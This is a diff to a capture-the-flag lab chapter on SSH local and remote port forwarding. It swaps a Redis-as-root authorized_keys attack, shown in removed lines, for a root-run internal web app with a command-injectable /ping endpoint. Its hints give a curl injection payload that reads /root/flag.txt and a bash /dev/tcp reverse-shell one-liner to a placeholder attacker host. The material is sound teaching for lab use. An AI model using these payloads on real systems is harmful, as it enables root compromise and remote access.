@@ -11,13 +11,14 @@
 
 `sudo -l` is empty. No odd SUID, no capabilities. Enumeration of the *host* is
 a dead end — because the vulnerable thing isn't a file, it's a **service**. This
-box runs Redis bound to `127.0.0.1`, with no password, **as root**. The admins
+box runs an internal "diagnostics" web app bound to `127.0.0.1:8080`, **as
+root**, and its `/ping` endpoint shells out with unsanitised input. The admins
 figured loopback-only meant unreachable.
 
 It isn't. Loopback-only stops a *remote* client. It does nothing against someone
-who already has a shell and can **forward a port** to it. Open an SSH tunnel
-from your attacker box straight to the target's `127.0.0.1:6379`, and now your
-`redis-cli` is talking to a root-owned Redis — which can write any file on disk.
+who already has a shell and can **forward a port** to it. Tunnel from your
+attacker box straight to the target's `127.0.0.1:8080`, hit `/ping?host=`, and a
+`;` in the parameter is command execution as root.
 
 > **The whole idea in one line:** a service on `127.0.0.1` is not safe from
 > someone with a shell — `ssh -L` turns the target's loopback into *your*
@@ -40,7 +41,7 @@ from your attacker box straight to the target's `127.0.0.1:6379`, and now your
 ```bash
 # on the target, as labuser1:
 ss -tlnp            # what's listening, and on which interface?
-# 127.0.0.1:6379 -> Redis, loopback only
+# 127.0.0.1:8080 -> an internal web service, loopback only
 ```
 
 A service bound to `127.0.0.1` that you can't reach from outside is exactly the
@@ -54,8 +55,8 @@ From the **attacker** box (not the target):
 
 ```bash
 # -L  LOCAL forward: pull the TARGET's loopback service to YOU
-ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
-redis-cli -h 127.0.0.1 -p 6379 ping        # PONG — root's Redis
+ssh -L 8080:127.0.0.1:8080 labuser1@target-pivot
+curl http://127.0.0.1:8080/                 # the internal diagnostics app
 
 # -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
 python3 -m http.server 8000                 # your payload server
@@ -73,26 +74,29 @@ side.
 
 | Station | Forward | The service | Win |
 |---|---|---|---|
-| A | `-L` local | root Redis on `127.0.0.1:6379` | make it write `/root/.ssh/authorized_keys` → `ssh root@` |
+| A | `-L` local | a root web app on `127.0.0.1:8080` with command injection | inject in `/ping?host=` → **RCE as root** |
 | B | `-R` remote | a root updater that fetches `http://127.0.0.1:9000/` | publish your script there → root runs it |
+
+Both end in code execution **as root** — the chapter is about *reaching* the
+service, then exploiting it.
 
 ---
 
 ## Hints
 
-<details><summary>Station A — local forward → Redis → authorized_keys</summary>
+<details><summary>Station A — local forward → web RCE</summary>
 
-Open the `-L` forward, then drive Redis:
+Open the `-L` forward, then look at the app: `curl http://127.0.0.1:8080/` shows
+a `/ping?host=` diagnostics endpoint. It runs `ping -c1 <host>` through a shell,
+so a `;` in `host` starts a second command — and the app runs as root:
+
+```bash
+curl -G 'http://127.0.0.1:8080/ping' \
+  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt'
 ```
-redis-cli -h 127.0.0.1 -p 6379
-> config set dir /root/.ssh
-> config set dbfilename authorized_keys
-> set x "\n\n<your ssh public key>\n\n"
-> save
-```
-`SAVE` dumps to `<dir>/<dbfilename>`. The RDB file has binary header/footer
-bytes, so pad your key with blank lines — sshd skips the garbage and reads your
-key. Then `ssh -i yourkey root@target-pivot`.
+
+For an interactive shell, inject a reverse shell back to a listener on your box
+(`bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`). See [[Reverse-Shell-Reference]].
 
 </details>
 
@@ -119,12 +123,12 @@ the same `-L`/`-R` forwards. The debrief has all of it.
 ## Capture
 
 ```bash
-# Station A:
-ssh -i yourkey root@target-pivot 'id; cat /root/flag.txt'
+# Station A (command injection runs as root, over the -L tunnel):
+curl -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1; cat /root/flag.txt'
 # Station B (your payload copied it out):
 ssh labuser1@target-pivot cat /tmp/flag
 ```
 
-The debrief — the Redis-as-root mechanic, `-L` / `-R` / `-D` forwarding, chisel
+The debrief — the loopback-RCE mechanic, `-L` / `-R` / `-D` forwarding, chisel
 for when you have no SSH, detection, and the fix — is in [WRITEUP.md](WRITEUP.md).
 Try the box before you open it.
